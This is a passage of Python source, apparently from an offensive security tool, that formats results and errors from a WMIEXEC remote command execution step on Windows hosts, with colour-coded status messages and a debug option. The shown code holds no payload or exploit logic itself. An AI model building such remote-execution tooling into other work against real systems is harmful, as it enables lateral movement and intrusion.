                    if debug:
                        return formatted_lines + f"\n\n{out}"

                    else:
                        return brightred + f"[!] Failed to execute command, run with --debug for more info"

            else:
                if debug:
                    return brightred + f"[!] no WMIEXEC response\n\n{out}"

                else:
                    return brightred + "[!] no WMIEXEC response"

        elif "WMIEXEC" not in out and debug:
            return brightred + f"[!] no WMIEXEC response\n\n{out}"

        else:
            return brightred + "[!] no WMIEXEC response"

    else:
        return brightyellow + "[*] No output or host unreachable"